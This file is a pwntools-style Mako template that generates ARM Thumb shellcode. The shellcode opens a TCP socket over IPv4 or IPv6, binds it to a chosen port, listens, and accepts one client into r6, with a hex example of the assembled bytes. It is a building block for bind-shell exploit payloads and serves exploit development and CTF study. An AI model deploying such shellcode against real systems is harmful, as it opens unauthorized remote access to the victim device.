<% from pwnlib.shellcraft.thumb import mov %>
<% from socket import htons %>
<%page args="port, network='ipv4'"/>
<%docstring>
    listen(port,network)

    Listens on a TCP port, accept a client and leave his socket in r6.
    Port is the TCP port to listen on, network is either 'ipv4' or 'ipv6'.

    Example:
        >>> enhex(asm(shellcraft.listen(1337, 'ipv4')))
        '4ff001074fea072707f119074ff002004ff0010182ea020201df0646004901e00200053906b469464ff0100207f1010701df30464ff0010107f1020701df304681ea010182ea020207f1010701df0646'
</%docstring>
    /* First create listening socket */
    ${mov('r7', 'SYS_socket')}
%if network == 'ipv4':
    ${mov('r0', 'AF_INET')}
%else:
    ${mov('r0', 'AF_INET6')}
%endif
    ${mov('r1', 'SOCK_STREAM')}
    eor r2, r2
    svc 1

    /* Save socket in r6 */
    mov r6, r0

%if network == 'ipv4':
    /* Build sockaddr_in structure */
    /* r2 is zero == INADDR_ANY */
    /* Put port and address family into r1 */
    ${mov('r1', 'AF_INET | (%d << 16)' % htons(port))}
    push {r1, r2}

    /* Address of sockaddr_in into r1 */
    mov r1, sp

    /* sizeof(sockaddr_in) into r2 */
    mov r2, #16

    /* Socket already in r0 */
    /* r7 is 281 = SYS_socket, add one and it is 282 = SYS_bind */
    add r7, #1
    svc 1
%else:
    /* Build sockaddr_in6 structure */
    /* r2 is already zero */
    eor r1, r1
    eor r3, r3
    push {r1, r2, r3}
    push {r1, r2, r3}
    
    /* Then port = %d */
    ${mov('r1', 'AF_INET6 | (%d << 16)' % htons(port))}
    push {r1, r2, r3}

    /* Address of sockaddr_in6 into r1 */
    mov r1, sp

    /* sizeof(sockaddr_in6) into r2 */
    mov r2, #28

    /* Socket already in r0 */
    /* r7 is 281 = SYS_socket, add one and it is 282 = SYS_bind */
    add r7, #1
    svc 1
%endif

    /* Server socket from r6 into r0 */
    mov r0, r6

    /* Backlog */
    mov r1, #1

    /* r7 = SYS_listen = 284 */
    /* r7 is already = 282 so just add two */
    add r7, #2
    svc 1

    /* Server socket from r6 into r0 */
    mov r0, r6

    /* Other args are null */
    eor r1, r1
    eor r2, r2

    /* r7 = SYS_accept = 285 */
    /* r7 is already = 284 so just add one */
    add r7, #1
    svc 1

    /* Move accepted socket to r6 */
    mov r6, r0
